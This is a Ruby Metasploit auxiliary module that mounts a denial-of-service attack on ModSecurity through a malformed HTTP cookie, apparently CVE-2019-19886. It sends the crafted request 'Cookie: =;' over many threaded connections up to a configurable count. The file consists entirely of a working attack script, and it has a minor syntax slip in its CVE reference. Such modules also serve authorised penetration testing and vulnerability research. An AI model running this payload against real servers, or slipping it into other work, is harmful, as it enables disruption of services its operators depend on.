##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/Placidina/metasploit
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'ModSecurity Malformed HTTP Cookie',
        'Author' => ['Alan Placidina Maria'],
        'References' => [
          ['CVE' '2019-19886']
        ],
        'DisclosureDate' => 'Dec 18 2019'
      )
    )

    register_options(
      [
        OptInt.new('RLIMIT', [true, 'The number of requests to send', 1000]),
        OptInt.new('THREADS', [true, 'The number of concurrent threads', 1]),
        OptInt.new('TIMEOUT', [true, 'The maximum time in seconds to wait for each request to finish', 15]),
        Opt::RPORT(80)
      ]
    )
  end

  def rlimit
    datastore['RLIMIT']
  end

  def thread_count
    datastore['THREADS']
  end

  def timeout
    datastore['TIMEOUT']
  end

  def run
    starting_thread = 1
    while starting_thread < rlimit
      ubound = [rlimit - (starting_thread - 1), thread_count].min
      print_status("Executing requests #{starting_thread} - #{(starting_thread + ubound) - 1}...")

      threads = []
      1.upto(ubound) do |i|
        threads << framework.threads.spawn("Module(#{refname})-request#{(starting_thread - 1) + i}", false, i) do |_i|
          begin
            connect
            sock.put("GET / HTTP/1.0\r\nCookie: =;\r\n\r\n")
            disconnect
          rescue StandardError => e
            print_good("DoS packet error: #{e}")
          ensure
            disconnect
          end
        end
      end

      threads.each(&:join)
      print_good("Finished executing requests #{starting_thread} - #{(starting_thread + ubound) - 1}")
      starting_thread += ubound
    end
  end
end
